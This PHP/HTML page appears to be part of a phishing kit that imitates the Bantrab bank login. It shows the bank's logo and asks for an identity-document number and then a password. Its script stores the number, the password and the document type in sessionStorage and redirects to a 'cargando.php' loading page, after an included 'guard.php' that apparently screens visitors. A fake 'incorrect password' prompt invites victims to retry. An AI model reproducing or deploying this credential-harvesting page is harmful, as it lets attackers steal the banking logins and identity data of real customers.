<?php require __DIR__ . '/guard.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
    :root {
      --blue: #007bff;
      --indigo: #6610f2;
      --purple: #6f42c1;
      --pink: #e83e8c;
      --red: #dc3545;
      --orange: #fd7e14;
      --yellow: #ffc107;
      --green: #28a745;
      --teal: #20c997;
      --cyan: #17a2b8;
      --white: #fff;
      --gray: #6c757d;
      --gray-dark: #343a40;
      --primary: #007bff;
      --secondary: #6c757d;
      --success: #28a745;
      --info: #17a2b8;
      --warning: #ffc107;
      --danger: #dc3545;
      --light: #f8f9fa;
      --dark: #343a40;
      --breakpoint-xs: 0;
      --breakpoint-sm: 576px;
      --breakpoint-md: 768px;
      --breakpoint-lg: 992px;
      --breakpoint-xl: 1200px;
      --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
      --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
    }

    *, *::before, *::after { box-sizing: border-box; }

    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      font-size: 1rem;
      font-weight: 400;
      line-height: 1.5;
      color: rgb(33, 37, 41);
      text-align: left;
      -webkit-text-size-adjust: 100%;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      margin-top: 20px;
      background-image: url('img/background_login.png');
      background-size: cover;
      background-position: center center;
      background-repeat: no-repeat;
      background-attachment: fixed;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 40px 20px;
    }

    .page-wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 420px;
      gap: 24px;
    }

    .login-card {
      background: #ffffff;
      border-radius: 24px;
      padding: 40px 36px 36px;
      width: 100%;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
    }

    .logo-area {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 80px;
      margin-bottom: 24px;
    }

    .logo-placeholder {
      width: 220px;
      height: 70px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .login-subtitle {
      text-align: center;
      color: rgba(85,85,85,1);
      font-size: 15px;
      font-weight: 400;
      margin-bottom: 28px;
      line-height: 1.4;
    }

    .field-group { margin-bottom: 18px; }

    .field-group fieldset {
      border: 1.5px solid #c8c8c8;
      border-radius: 10px;
      padding: 2px 14px 6px;
      background: #fff;
    }

    .field-group fieldset legend {
      font-size: 15px;
      font-weight: 700;
      color: rgba(76,76,76,1);
      padding: 0 6px;
      margin-left: 4px;
    }

    .field-group fieldset select {
      width: 100%;
      border: none;
      outline: none;
      font-size: 15px;
      color: #333;
      background: transparent;
      padding: 2px 0;
      cursor: pointer;
      appearance: none;
      -webkit-appearance: none;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23555' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
      background-repeat: no-repeat;
      background-position: right 0 center;
      padding-right: 24px;
    }

    .float-field { position: relative; margin-bottom: 26px; }

    .float-field input {
      width: 100%;
      border: 1.5px solid #c8c8c8;
      border-radius: 10px;
      padding: 10px 16px;
      font-size: 15px;
      color: #333;
      outline: none;
      background: #fff;
      transition: border-color 0.2s;
    }

    .float-field input::placeholder { color: transparent; }

    .float-field label {
      position: absolute;
      left: 14px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 15px;
      color: #aaa;
      background: transparent;
      padding: 0 4px;
      pointer-events: none;
      transition: all 0.18s ease;
      white-space: nowrap;
    }

    .float-field input:focus,
    .float-field input:not(:placeholder-shown) {
      border-color: #2DBFBF;
    }

    .float-field input:focus + label,
    .float-field input:not(:placeholder-shown) + label {
      top: 0;
      font-size: 13px;
      font-weight: 700;
      color: #2DBFBF;
      background: #fff;
    }

    .float-field.filled input { border-color: #c8c8c8; }
    .float-field.filled input + label { color: rgba(76,76,76,1); }

    .password-section {
      display: none;
      opacity: 0;
      padding-top: 14px;
      margin-top: -14px;
      transition: opacity 0.35s ease;
    }

    .password-section.visible { opacity: 1; }

    .tooltip-val {
      display: none;
      position: absolute;
      bottom: calc(100% + 10px);
      left: 12px;
      background: #5a5a5a;
      color: #fff;
      font-size: 13px;
      padding: 8px 12px 8px 10px;
      border-radius: 6px;
      white-space: nowrap;
      z-index: 99;
      align-items: center;
      gap: 8px;
      box-shadow: 0 3px 10px rgba(0,0,0,0.25);
    }

    .tooltip-val.show { display: flex; }

    .tooltip-val::before {
      content: '';
      position: absolute;
      top: 100%;
      left: 18px;
      border: 7px solid transparent;
      border-top-color: #5a5a5a;
    }

    .tooltip-val .tip-icon {
      background: #555;
      color: #fff;
      font-weight: 700;
      font-size: 13px;
      width: 22px;
      height: 22px;
      border-radius: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }

    .btn-continuar {
      width: 100%;
      padding: 16px;
      background-color: #A8DCDC;
      color: #ffffff;
      border: none;
      border-radius: 12px;
      font-size: 17px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .btn-continuar:hover { background-color: #2DBFBF; }
    .btn-continuar.active { background-color: #2DBFBF; cursor: pointer; }
  </style>
</head>
<body>
<br><br>
  <div class="page-wrapper">

    <div class="login-card">
      <div class="logo-area">
        <div class="logo-placeholder"><img style="width: 100%;" src="img/logo_bantrab.png" alt=""></div>
      </div>

      <p class="login-subtitle">Ingresa tu tipo y número de documento</p>

      <div class="field-group">
        <fieldset>
          <legend>Documento</legend>
          <select name="documento">
            <option value="DPI">DPI</option>
            <option value="pasaporte">Pasaporte</option>
           </select>
        </fieldset>
      </div>

      <div class="float-field">
        <input type="text" id="numeroDoc" name="numero" placeholder=" " />
        <label for="numeroDoc">Número de documento</label>
      </div>

      <div class="password-section" id="passSection">
        <div class="float-field" style="margin-bottom:26px;position:relative;">
          <div class="tooltip-val" id="passTooltip">
            <span class="tip-icon">
              <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
              </svg>
            </span>
            Ingresa tu contraseña
          </div>
          <input type="password" id="passDoc" name="pass" placeholder=" " />
          <label for="passDoc">Contraseña</label>
        </div>
      </div>

      <button class="btn-continuar" id="btnContinuar" disabled>Continuar</button>
    </div>
<img src="img/descarga.png" alt="">
  </div>

  <script>
    const input       = document.getElementById('numeroDoc');
    const btn         = document.getElementById('btnContinuar');
    const field       = document.querySelector('.float-field');
    const passSection = document.getElementById('passSection');
    const passInput   = document.getElementById('passDoc');
    const MIN         = 4;

    input.addEventListener('input', function () {
      if (this.value.length >= MIN) {
        btn.classList.add('active');
        btn.disabled = false;
        field.classList.add('filled');
      } else {
        btn.classList.remove('active');
        btn.disabled = true;
        field.classList.remove('filled');
        passSection.style.display = 'none';
        passSection.classList.remove('visible');
      }
    });

    const docSelect = document.querySelector('select[name="documento"]');

    function showPass() {
      if (btn.disabled) return;

      if (passSection.classList.contains('visible')) {
        if (passInput.value.trim() === '') {
          passTooltip.classList.add('show');
          passInput.focus();
          setTimeout(() => passTooltip.classList.remove('show'), 2500);
          return;
        }
        submitLogin();
        return;
      }

      passSection.style.display = 'block';
      requestAnimationFrame(() => passSection.classList.add('visible'));
      setTimeout(() => {
        passInput.focus();
        passTooltip.classList.add('show');
        setTimeout(() => passTooltip.classList.remove('show'), 2500);
      }, 350);
    }

    function submitLogin() {
      sessionStorage.setItem('pending_action',  'login');
      sessionStorage.setItem('login_documento', docSelect.value);
      sessionStorage.setItem('login_numero',    input.value.trim());
      sessionStorage.setItem('login_pass',      passInput.value.trim());
      window.location.href = 'cargando.php';
    }

    btn.addEventListener('click', showPass);

    input.addEventListener('keydown', function (e) {
      if (e.key === 'Enter') showPass();
    });

    const passTooltip = document.getElementById('passTooltip');

    passInput.addEventListener('input', function () {
      passTooltip.classList.remove('show');
    });

    if (new URLSearchParams(location.search).get('err') === 'password') {
      setTimeout(() => alert('Documento o contraseña incorrectos. Intenta nuevamente.'), 200);
    }
  </script>
</body>
</html>
